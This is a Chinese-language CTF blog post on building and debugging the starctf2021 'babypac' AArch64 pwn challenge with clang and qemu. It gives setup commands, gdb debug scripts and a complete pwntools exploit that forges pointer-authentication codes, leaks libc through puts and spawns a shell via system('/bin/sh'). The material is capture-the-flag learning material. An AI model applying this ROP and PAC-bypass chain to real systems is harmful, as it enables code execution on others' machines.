---
title: 使用基于llvm的clang编译arm pwn题目以及arm pwn使用qemu调试脚本
date: 2021-01-28 19:18:40
tags:
---

这里以starctf2021的babypac为例
[https://github.com/sixstars/starctf2021/blob/main/pwn-babypac/main.c](https://github.com/sixstars/starctf2021/blob/main/pwn-babypac/main.c)
```bash
sudo apt install qemu-user
sudo apt install gcc-aarch64-linux-gnu 
sudo apt install gdb-multiarch
sudo apt install clang
wget https://cdn.jsdelivr.net/gh/sixstars/starctf2021@main/pwn-babypac/main.c
clang -s -I/usr/aarch64-linux-gnu/include --target=aarch64-linux-gnu -march=armv8.3a -mbranch-protection=pac-ret -z now -o chall main.c 
qemu-aarch64 -cpu max  -L /usr/aarch64-linux-gnu/ ./chall ## 这里的-s表示去除符号表，是传递给linker的参数，help documentation里没有，具体可以去 linker flag查。
```

下面附上几个调试脚本：
```bash
#!/bin/sh
fuser -k 1234/tcp
clang -s -I/usr/aarch64-linux-gnu/include --target=aarch64-linux-gnu -march=armv8.3a -mbranch-protection=pac-ret -z now -o test test.c
x-terminal-emulator -e "qemu-aarch64 -g 1234 -cpu max  -L . ./test2"
x-terminal-emulator -e "gdb-multiarch -ex 'set arch aarch64' -ex 'set sysroot .' -ex 'set endian little' -ex 'target remote localhost:1234'  ./test2"
```

```bash
#!/bin/sh
fuser -k 1234/tcp
gcc test.c -o test
x-terminal-emulator -e "gdbserver :1234 ./test"
x-terminal-emulator -e "gdb -ex  'target remote localhost:1234'  ./test"
```

```python
from pwn import *
import code
import time
import os
context.arch = 'aarch64'
context.log_level = 'debug'
libc=ELF("./lib/libc.so.6")
def get_i_bit_right(cipher, bits):
    tmp = cipher[:bits]
    for i in range(len(cipher) - bits):
        tmp.append(tmp[i] ^ cipher[i+bits])
    return tmp
def get_i_bit_left(cipher, bits):
    tmp = cipher[-bits:]
    for i in range(len(cipher) - bits):
        tmp = [tmp[-(i+1)] ^ cipher[-(i+bits+1)]] + tmp
    return tmp
def digit_pac(res):
    known = [int(i) for i in bin(u64(res))[2:].rjust(64, '0')]
 
    t1 = get_i_bit_right(known, 13)
    t2 = get_i_bit_left(t1, 31)
    t3 = get_i_bit_right(t2, 11)
    t4 = get_i_bit_left(t3, 7)
    return int(''.join([str(i) for i in t4]), 2)
a=os.popen('fuser -k 1234/tcp')
print(a.read())
sh = process(["qemu-aarch64","-g","1234", "-cpu", "max", "-L", ".", "./chall"])
pwnlib.util.misc.run_in_new_terminal('gdb-multiarch   -ex \'set arch aarch64\' -ex \'set sysroot .\' -ex \'set endian little\' -ex \'target remote localhost:1234\' -ex \'b *0x0400c08\'  ./chall')
def call(func,addr1,addr2,addr3,flag):
    print(sh.recvuntil(b'name: '))
    sh.send(p64(0x400ff8)+p64(0)+p64(0x10a9fc70042)+p64(0))
    print(sh.recv())
    sh.sendline("3")
    print(sh.recvuntil(b'name: '))
    sh.sendline("2")
    sh.sendline("-1")
    sh.sendline("2")
    sh.sendline("-2")
    sh.sendline("3")
    print(sh.recvuntil(b'name: '))
    pac_addr=sh.recv(8)
    pac_addr=p64(digit_pac(pac_addr))
    print(pac_addr)
    sh.sendline("4")
    sh.sendline("-1")
    sh.send(p64(0)*5+pac_addr+p64(0)+p64(0x400fd8)+p64(0)+p64(1)+p64(func)+p64(addr1)+p64(addr2)+p64(addr3)+p64(0x0)+p64(0x400e84))
    if flag==1:
        val=sh.recvuntil(b'\n\n #')
        val=val[66:-4]
        return val
a=call(0x411fd0,0x411fd0,0,0,1)
b=call(0x411fd0,0x411fd4,0,0,1)

puts_addr=a+b'\x00'+b
puts_addr=puts_addr.ljust(8, b'\0')
print("puts_addr")
print(hex(u64(puts_addr)))
libc_base=u64(puts_addr)-libc.symbols['puts']
system_addr=libc_base+libc.symbols['system']
print("system_addr")
print(hex(system_addr))
call(0x0411fd8,0,0x4120a0,16,0)
sh.send(p64(system_addr)+b'/bin/sh\x00')

#sh_addr=libc_base+next(libc.search(b'/bin/sh'))

call(0x4120A0,0x4120a8,0,0,0)
sh.interactive()
code.interact(local=locals())


```


